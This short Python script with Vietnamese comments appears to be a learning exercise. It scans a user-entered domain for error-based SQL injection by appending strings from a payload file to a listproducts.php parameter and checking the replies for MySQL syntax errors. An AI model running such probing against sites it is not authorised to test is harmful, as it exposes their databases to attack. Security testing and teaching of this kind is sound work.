#!/usr/bin/python
# Mô đun requests :được sử dụng để gửi các yêu cầu HTTP  và nhận các phản hồi HTTP từ máy chủ web.
# gửi các yêu cầu GET, POST, PUT, DELETE và các loại yêu cầu HTTP khác
# hữu ích khi muốn tương tác với các API hoặc trang web từ trong ứng dụng Python của mình
import requests


def read_file_mysql():
    # Mở file MYSQL.txt và lấy danh sách chuỗi tấn công
    with open('MYSQL.txt', 'r') as file:
        mysql_attack = [line.strip() for line in file.readlines()]  # tách /n
    return mysql_attack  # return


# Lặp qua danh sách chuỗi tấn công và thử tấn công trang web
def error_sql_injection(domain):
    mysql_attack = read_file_mysql()
    for attack in mysql_attack:
        # Tạo URL tấn công
        url = domain + attack
        # Gửi yêu cầu GET đến trang web với chuỗi tấn công
        response = requests.get(url)
        # Kiểm tra xem trang web có trả về lỗi không
        if "You have an error in your SQL syntax" in response.text:
            print(f"Found SQL Injection vulnerability with attack string: {attack}")  # thông báo


if __name__ == '__main__':
    # Địa chỉ của trang web
    domain = input("Enter domain :")
    url = f'http://{domain}/listproducts.php?cat='
    error_sql_injection(url)
